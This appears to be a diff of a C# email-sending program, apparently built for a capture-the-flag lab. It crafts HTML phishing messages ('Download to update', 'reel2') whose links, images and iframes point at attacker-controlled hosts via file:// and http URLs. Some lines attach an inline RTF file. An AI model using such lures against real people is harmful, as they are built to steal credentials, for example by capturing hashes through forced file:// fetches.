@@ -56,22 +56,32 @@ namespace HelloWorld
             // email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"testimg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
 
             string html = @"<html>
-                            <head>
-                            </head>
-                            <body>
-                                <img width=100 height=100 id=""1"" src=""cid:message.rtf"">
-                            </body>
-                            </html>";
-            email.Body = new MessageBody(BodyType.HTML, html);
+            <head>
+            </head>
+            <body>
+	    <a href=""http://10.10.14.18"">10.10.14.18</a>
+            </body>
+            </html>";
 
-            // string file = @"D:\Pictures\Party.jpg";
+            // string html = @"cid:message.html";
+
+	    email.Body = new MessageBody(BodyType.HTML, html);
+
+            // string file = @"D:\pictures\Party.jpg";
+            // string file = @"/mnt/d/pictures/Party.jpg";
             // email.Attachments.AddFileAttachment("Party.jpg", file);
             // email.Attachments[0].IsInline = true;
             // email.Attachments[0].ContentId = "Party.jpg";
-            string file = @"D:\Pictures\message.rtf";
-            email.Attachments.AddFileAttachment("message.rtf", file);
-            email.Attachments[0].IsInline = true;
-            email.Attachments[0].ContentId = "message.rtf";            
+            
+	    // string file = @"/mnt/d/pictures/message.rtf";
+            // email.Attachments.AddFileAttachment("message.rtf", file);
+            // email.Attachments[0].IsInline = true;
+            // email.Attachments[0].ContentId = "message.rtf";            
+
+            // string file = @"/mnt/d/pictures/message.html";
+            // email.Attachments.AddFileAttachment("message.html", file);
+            // email.Attachments[0].IsInline = true;
+            //email.Attachments[0].ContentId = "message.html";            
 
             // email.Body = new MessageBody("<html><h1>Download to update</h1><p>1. Try inserting an image</p><img src='file://10.10.14.12/download.jpg'><p>2. Try inserting an iframe:</p><iframe src='file://10.10.14.12/download.png'></iframe><p>3. Try inserting a hyperlink: <a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
 
